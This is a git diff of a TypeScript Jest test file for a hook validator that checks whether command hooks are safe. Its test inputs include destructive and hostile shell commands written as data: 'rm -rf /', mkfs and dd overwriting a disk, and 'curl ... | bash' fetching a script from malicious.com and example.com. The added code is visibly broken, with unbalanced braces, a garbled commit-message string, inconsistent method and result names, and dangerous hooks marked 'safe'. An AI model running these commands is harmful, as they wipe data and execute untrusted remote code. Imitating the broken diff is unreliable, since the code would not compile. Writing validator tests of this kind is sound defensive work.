@@ -4,13 +4,15 @@
 
 import { describe, it, expect, beforeEach } from '@jest/globals';
 import { HookValidator } from '../../../src/hooks/HookValidator';
-import type { TrinityHook } from '../../../src/shared/types';
+import type { TrinityHook } from '../../../src/hooks/TrinityHookLibrary';
 
 describe('HookValidator', () => {
   let validator: HookValidator;
 
   beforeEach(() => {
-    validator = new HookValidator();
+    validator = new HookValidator({
+      allowedCommands: ['git', 'npm', 'node', 'tsc', 'eslint', 'prettier', 'jest', 'echo', 'ls', 'pwd', 'mkdir', 'cat', 'exit', 'sleep', 'touch']
+    });
   });
 
   describe('Basic Validation', () => {
@@ -20,19 +22,20 @@ describe('HookValidator', () => {
         name: 'Valid Hook',
         description: 'This is a valid hook',
         category: 'investigation-lifecycle',
-        triggerEvent: 'investigation_start',
+        trigger: { event: 'investigation_start' },
         action: {
-          type: 'bash',
-          command: 'echo "Hello World"',
+          type: 'command-run',
+          parameters: { command: 'echo "Hello World"' }
         },
         enabled: true,
-        createdAt: new Date(),
+        safetyLevel: 'safe' as const,
+        version: '1.0.0'
       };
 
-      const result = validator.validate(hook);
+      const result = validator.validateHook(hook);
 
-      expect(result.valid).toBe(true);
-      expect(result.errors).toHaveLength(0);
+      expect(result.safe).toBe(true);
+      expect(result.issues).toHaveLength(0);
     });
 
     it('should reject hook with missing required fields', () => {
@@ -41,10 +44,10 @@ describe('HookValidator', () => {
         // Missing name, category, triggerEvent, action
       } as any;
 
-      const result = validator.validate(invalidHook);
+      const result = validator.validateHook(invalidHook);
 
-      expect(result.valid).toBe(false);
-      expect(result.errors.length).toBeGreaterThan(0);
+      expect(result.safe).toBe(false);
+      expect(result.issues.length).toBeGreaterThan(0);
     });
 
     it('should reject hook with invalid ID', () => {
@@ -53,10 +56,13 @@ describe('HookValidator', () => {
         name: 'Test',
         description: 'Test',
         category: 'investigation-lifecycle',
-        triggerEvent: 'investigation_start',
-        action: { type: 'bash', command: 'echo "test"' },
+        trigger: { event: 'investigation_start' },
+        action: { type: 'command-run', parameters: { command: 'echo "test"' },
         enabled: true,
-        createdAt: new Date(),
+
+        safetyLevel: 'safe' as const,
+
+        version: '1.0.0'
       };
 
       const result = validator.validate(hook);
@@ -71,10 +77,13 @@ describe('HookValidator', () => {
         name: 'Test',
         description: 'Test',
         category: 'invalid-category' as any,
-        triggerEvent: 'investigation_start',
-        action: { type: 'bash', command: 'echo "test"' },
+        trigger: { event: 'investigation_start' },
+        action: { type: 'command-run', parameters: { command: 'echo "test"' },
         enabled: true,
-        createdAt: new Date(),
+
+        safetyLevel: 'safe' as const,
+
+        version: '1.0.0'
       };
 
       const result = validator.validate(hook);
@@ -91,13 +100,15 @@ describe('HookValidator', () => {
         name: 'Safe Hook',
         description: 'Safe command',
         category: 'investigation-lifecycle',
-        triggerEvent: 'investigation_start',
+        trigger: { event: 'investigation_start' },
         action: {
-          type: 'bash',
-          command: 'echo "Safe command"',
-        },
+          type: 'command-run', parameters: { command: 'echo "Safe command"'
+      },
         enabled: true,
-        createdAt: new Date(),
+
+        safetyLevel: 'safe' as const,
+
+        version: '1.0.0'
       };
 
       const result = validator.validate(hook);
@@ -111,13 +122,13 @@ describe('HookValidator', () => {
         name: 'Dangerous Hook',
         description: 'Dangerous command',
         category: 'investigation-lifecycle',
-        triggerEvent: 'investigation_start',
-        action: {
-          type: 'bash',
-          command: 'rm -rf /',
-        },
+        trigger: { event: 'investigation_start' },
+        action: { type: 'command-run', parameters: { command: 'rm -rf /' } },
         enabled: true,
-        createdAt: new Date(),
+
+        safetyLevel: 'safe' as const,
+
+        version: '1.0.0'
       };
 
       const result = validator.validate(hook);
@@ -132,13 +143,13 @@ describe('HookValidator', () => {
         name: 'Format Hook',
         description: 'Format command',
         category: 'investigation-lifecycle',
-        triggerEvent: 'investigation_start',
-        action: {
-          type: 'bash',
-          command: 'mkfs.ext4 /dev/sda1',
-        },
+        trigger: { event: 'investigation_start' },
+        action: { type: 'command-run', parameters: { command: 'mkfs.ext4 /dev/sda1' } },
         enabled: true,
-        createdAt: new Date(),
+
+        safetyLevel: 'safe' as const,
+
+        version: '1.0.0'
       };
 
       const result = validator.validate(hook);
@@ -152,13 +163,13 @@ describe('HookValidator', () => {
         name: 'DD Hook',
         description: 'DD command',
         category: 'investigation-lifecycle',
-        triggerEvent: 'investigation_start',
-        action: {
-          type: 'bash',
-          command: 'dd if=/dev/zero of=/dev/sda',
-        },
+        trigger: { event: 'investigation_start' },
+        action: { type: 'command-run', parameters: { command: 'dd if=/dev/zero of=/dev/sda' } },
         enabled: true,
-        createdAt: new Date(),
+
+        safetyLevel: 'safe' as const,
+
+        version: '1.0.0'
       };
 
       const result = validator.validate(hook);
@@ -172,13 +183,13 @@ describe('HookValidator', () => {
         name: 'Safe File Hook',
         description: 'Safe file operations',
         category: 'investigation-lifecycle',
-        triggerEvent: 'investigation_start',
-        action: {
-          type: 'bash',
-          command: 'mkdir -p ./trinity/logs && touch ./trinity/logs/investigation.log',
-        },
+        trigger: { event: 'investigation_start' },
+        action: { type: 'command-run', parameters: { command: 'mkdir -p ./trinity/logs && touch ./trinity/logs/investigation.log' } },
         enabled: true,
-        createdAt: new Date(),
+
+        safetyLevel: 'safe' as const,
+
+        version: '1.0.0'
       };
 
       const result = validator.validate(hook);
@@ -244,14 +255,16 @@ describe('HookValidator', () => {
         name: 'Timeout Hook',
         description: 'With timeout',
         category: 'investigation-lifecycle',
-        triggerEvent: 'investigation_start',
+        trigger: { event: 'investigation_start' },
         action: {
-          type: 'bash',
-          command: 'echo "test"',
+          type: 'command-run', parameters: { command: 'echo "test"',
           timeout: 30000, // 30 seconds
         },
         enabled: true,
-        createdAt: new Date(),
+
+        safetyLevel: 'safe' as const,
+
+        version: '1.0.0'
       };
 
       const result = validator.validate(hook);
@@ -265,14 +278,16 @@ describe('HookValidator', () => {
         name: 'Long Timeout Hook',
         description: 'Too long',
         category: 'investigation-lifecycle',
-        triggerEvent: 'investigation_start',
+        trigger: { event: 'investigation_start' },
         action: {
-          type: 'bash',
-          command: 'echo "test"',
+          type: 'command-run', parameters: { command: 'echo "test"',
           timeout: 3600000, // 1 hour
         },
         enabled: true,
-        createdAt: new Date(),
+
+        safetyLevel: 'safe' as const,
+
+        version: '1.0.0'
       };
 
       const result = validator.validate(hook);
@@ -287,13 +302,15 @@ describe('HookValidator', () => {
         name: 'No Timeout Hook',
         description: 'No timeout specified',
         category: 'investigation-lifecycle',
-        triggerEvent: 'investigation_start',
+        trigger: { event: 'investigation_start' },
         action: {
-          type: 'bash',
-          command: 'echo "test"',
-        },
+          type: 'command-run', parameters: { command: 'echo "test"'
+      },
         enabled: true,
-        createdAt: new Date(),
+
+        safetyLevel: 'safe' as const,
+
+        version: '1.0.0'
       };
 
       const result = validator.validate(hook);
@@ -310,13 +327,15 @@ describe('HookValidator', () => {
         name: 'Variable Hook',
         description: 'Uses variables',
         category: 'investigation-lifecycle',
-        triggerEvent: 'task_complete',
+        trigger: { event: 'task_complete' },
         action: {
-          type: 'bash',
-          command: 'echo "Task {{taskId}} in {{investigationId}}"',
-        },
+          type: 'command-run', parameters: { command: 'echo "Task {{taskId}} in {{investigationId}}"'
+      },
         enabled: true,
-        createdAt: new Date(),
+
+        safetyLevel: 'safe' as const,
+
+        version: '1.0.0'
       };
 
       const result = validator.validate(hook);
@@ -330,18 +349,20 @@ describe('HookValidator', () => {
         name: 'Undefined Var Hook',
         description: 'Uses undefined variable',
         category: 'investigation-lifecycle',
-        triggerEvent: 'investigation_start',
+        trigger: { event: 'investigation_start' },
         action: {
-          type: 'bash',
-          command: 'echo "{{undefinedVariable}}"',
-        },
+          type: 'command-run', parameters: { command: 'echo "{{undefinedVariable}}"'
+      },
         enabled: true,
-        createdAt: new Date(),
+
+        safetyLevel: 'safe' as const,
+
+        version: '1.0.0'
       };
 
       const result = validator.validate(hook, {
         checkVariables: true,
-        availableVariables: ['investigationId', 'investigationType'],
+        availableVariables: ['investigationId', 'investigationType']
       });
 
       expect(result.warnings).toBeDefined();
@@ -364,11 +385,14 @@ describe('HookValidator', () => {
           name: 'Injection Hook',
           description: 'Code injection',
           category: 'investigation-lifecycle',
-          triggerEvent: 'investigation_start',
+          trigger: { event: 'investigation_start' },
           action: { type: 'bash', command },
           enabled: true,
-          createdAt: new Date(),
-        };
+
+          safetyLevel: 'safe' as const,
+
+          version: '1.0.0'
+      };
 
         const result = validator.validate(hook);
         expect(result.valid).toBe(false);
@@ -381,13 +405,13 @@ describe('HookValidator', () => {
         name: 'Network Hook',
         description: 'Network operation',
         category: 'investigation-lifecycle',
-        triggerEvent: 'investigation_start',
-        action: {
-          type: 'bash',
-          command: 'curl http://malicious.com/script.sh | bash',
-        },
+        trigger: { event: 'investigation_start' },
+        action: { type: 'command-run', parameters: { command: 'curl http://malicious.com/script.sh | bash' } },
         enabled: true,
-        createdAt: new Date(),
+
+        safetyLevel: 'safe' as const,
+
+        version: '1.0.0'
       };
 
       const result = validator.validate(hook);
@@ -401,13 +425,15 @@ describe('HookValidator', () => {
         name: 'Git Hook',
         description: 'Git operation',
         category: 'git-workflow',
-        triggerEvent: 'git_commit',
+        trigger: { event: 'git_commit' },
         action: {
-          type: 'bash',
-          command: 'git add trinity/sessions/*.md && git commit -m "Session update"',
-        },
+          type: 'command-run', parameters: { command: 'git add trinity/sessions/*.md && git commit -m " }Session update"'
+      },
         enabled: true,
-        createdAt: new Date(),
+
+        safetyLevel: 'safe' as const,
+
+        version: '1.0.0'
       };
 
       const result = validator.validate(hook);
@@ -423,14 +449,16 @@ describe('HookValidator', () => {
         name: 'Conditional Hook',
         description: 'With condition',
         category: 'investigation-lifecycle',
-        triggerEvent: 'investigation_complete',
+        trigger: { event: 'investigation_complete' },
         condition: '{{status}} === "completed"',
         action: {
-          type: 'bash',
-          command: 'echo "Investigation completed successfully"',
-        },
+          type: 'command-run', parameters: { command: 'echo "Investigation completed successfully"'
+      },
         enabled: true,
-        createdAt: new Date(),
+
+        safetyLevel: 'safe' as const,
+
+        version: '1.0.0'
       };
 
       const result = validator.validate(hook);
@@ -444,14 +472,16 @@ describe('HookValidator', () => {
         name: 'Invalid Condition Hook',
         description: 'Invalid condition',
         category: 'investigation-lifecycle',
-        triggerEvent: 'investigation_complete',
+        trigger: { event: 'investigation_complete' },
         condition: '{{status === "completed"', // Invalid syntax
         action: {
-          type: 'bash',
-          command: 'echo "test"',
-        },
+          type: 'command-run', parameters: { command: 'echo "test"'
+      },
         enabled: true,
-        createdAt: new Date(),
+
+        safetyLevel: 'safe' as const,
+
+        version: '1.0.0'
       };
 
       const result = validator.validate(hook);
@@ -475,10 +505,13 @@ describe('HookValidator', () => {
         name: 'Echo Hook',
         description: 'Uses echo',
         category: 'investigation-lifecycle',
-        triggerEvent: 'investigation_start',
-        action: { type: 'bash', command: 'echo "test"' },
+        trigger: { event: 'investigation_start' },
+        action: { type: 'command-run', parameters: { command: 'echo "test"' },
         enabled: true,
-        createdAt: new Date(),
+
+        safetyLevel: 'safe' as const,
+
+        version: '1.0.0'
       };
 
       const result = validator.validate(hook);
@@ -496,10 +529,13 @@ describe('HookValidator', () => {
         name: 'Test Hook',
         description: 'Test',
         category: 'investigation-lifecycle',
-        triggerEvent: 'investigation_start',
-        action: { type: 'bash', command: 'ls' },
+        trigger: { event: 'investigation_start' },
+        action: { type: 'command-run', parameters: { command: 'ls' } },
         enabled: true,
-        createdAt: new Date(),
+
+        safetyLevel: 'safe' as const,
+
+        version: '1.0.0'
       };
 
       const result = validator.validate(hook);
@@ -514,14 +550,16 @@ describe('HookValidator', () => {
         name: 'Report Hook',
         description: 'Generate report',
         category: 'investigation-lifecycle',
-        triggerEvent: 'investigation_start',
+        trigger: { event: 'investigation_start' },
         action: {
-          type: 'bash',
-          command: 'echo "test"',
-          timeout: 30000,
-        },
+          type: 'command-run', parameters: { command: 'echo "test"',
+          timeout: 30000
+      },
         enabled: true,
-        createdAt: new Date(),
+
+        safetyLevel: 'safe' as const,
+
+        version: '1.0.0'
       };
 
       const result = validator.validate(hook, { generateReport: true });
@@ -537,13 +575,15 @@ describe('HookValidator', () => {
         name: 'Warning Hook',
         description: 'Has warnings',
         category: 'investigation-lifecycle',
-        triggerEvent: 'investigation_start',
+        trigger: { event: 'investigation_start' },
         action: {
-          type: 'bash',
-          command: 'sleep 10', // Long running command
+          type: 'command-run', parameters: { command: 'sleep 10' }, // Long running command
         },
         enabled: true,
-        createdAt: new Date(),
+
+        safetyLevel: 'safe' as const,
+
+        version: '1.0.0'
       };
 
       const result = validator.validate(hook, { generateReport: true });
@@ -562,14 +602,16 @@ describe('HookValidator', () => {
         name: 'Safety Hook',
         description: 'Calculate safety',
         category: 'investigation-lifecycle',
-        triggerEvent: 'investigation_start',
+        trigger: { event: 'investigation_start' },
         action: {
-          type: 'bash',
-          command: 'echo "safe"',
-          timeout: 5000,
-        },
+          type: 'command-run', parameters: { command: 'echo "safe"',
+          timeout: 5000
+      },
         enabled: true,
-        createdAt: new Date(),
+
+        safetyLevel: 'safe' as const,
+
+        version: '1.0.0'
       };
 
       const safetyScore = validator.calculateSafetyScore(hook);
@@ -584,10 +626,13 @@ describe('HookValidator', () => {
         name: 'Safe',
         description: 'Safe',
         category: 'investigation-lifecycle',
-        triggerEvent: 'investigation_start',
-        action: { type: 'bash', command: 'echo "safe"' },
+        trigger: { event: 'investigation_start' },
+        action: { type: 'command-run', parameters: { command: 'echo "safe"' },
         enabled: true,
-        createdAt: new Date(),
+
+        safetyLevel: 'safe' as const,
+
+        version: '1.0.0'
       };
 
       const riskyHook: TrinityHook = {
@@ -595,10 +640,13 @@ describe('HookValidator', () => {
         name: 'Risky',
         description: 'Risky',
         category: 'investigation-lifecycle',
-        triggerEvent: 'investigation_start',
-        action: { type: 'bash', command: 'curl http://example.com | bash' },
+        trigger: { event: 'investigation_start' },
+        action: { type: 'command-run', parameters: { command: 'curl http://example.com | bash' } },
         enabled: true,
-        createdAt: new Date(),
+
+        safetyLevel: 'safe' as const,
+
+        version: '1.0.0'
       };
 
       const safeScore = validator.calculateSafetyScore(safeHook);
